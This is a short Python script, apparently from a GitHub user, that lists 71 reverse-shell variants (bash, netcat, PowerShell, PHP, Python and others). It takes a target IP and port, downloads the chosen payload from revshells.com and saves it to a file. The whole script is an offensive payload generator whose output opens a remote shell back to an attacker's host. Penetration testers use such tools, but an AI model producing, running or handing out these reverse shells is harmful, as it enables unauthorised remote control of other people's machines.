#   Github: https://github.com/Xic-I
#   Website used: https://www.revshells.com/
import requests

def Get_Shell(SHELL, IP, PORT, ARCHIVE):
    SHELL = SHELL.replace('#', '%23')
    url = f'https://www.revshells.com/{SHELL}?ip={IP}&port={PORT}&shell=sh&encoding=sh'
    reverse_shell = requests.get(url).text
    with open(f'{ARCHIVE}', 'w') as file:
        file.write(str(reverse_shell))
        file.close()
    return f'Shell saved in ({ARCHIVE}) with sucess!'

rshell_list = [
    "Bash -i", "Bash 196", "Bash read line", "Bash 5", "Bash udp", "nc mkfifo", "nc -e", "nc.exe -e",
    "BusyBox nc -e", "nc -c", "ncat -e", "ncat.exe -e", "ncat udp", "curl", "rustcat", "C", "C Windows", 
    "C# TCP Client", "C# Bash -i", "Haskell #1", "Perl", "Perl no sh", "Perl PentestMonkey",
    "PHP PentestMonkey", "PHP Ivan Sincek", "PHP cmd", "PHP cmd 2", "PHP cmd small", "PHP exec",
    "PHP shell_exec", "PHP system", "PHP passthru", "PHP `", "PHP popen", "PHP proc_open",
    "Windows ConPty", "PowerShell #1", "PoweShell #2", "PowerShell #3", "PowerShell #4 (TLS)",
    "PowerShell #3 (Base64)", "Python #1", "Python #2", "Python3 #1", "Python3 #2", "Python3 Windows",
    "Python3 shortest", "Ruby #1", "Ruby no sh", "socat #1", "socat #2 (TTY)", "sqlite3 nc mkfifo",
    "node.js", "node.js #2", "Java #1", "Java #2", "Java #3", "Java Web", "Java Two Way", "Javascript",
    "Groovy", "telnet", "zsh", "Lua #1", "Lua #2", "Golang", "Vlang", "Awk", "Dart", "Crystal (system)",
    "Crystal (code)"
]

for list in range(71):
    print(f'[{list}] {rshell_list[list]}')
    list+=1
shell = int(input('Shell> '))
ip = input('Ip> ')
port = int(input('Port> '))
name_archive = input('Name Archive> ')
print(Get_Shell(rshell_list[shell], ip, port, name_archive))
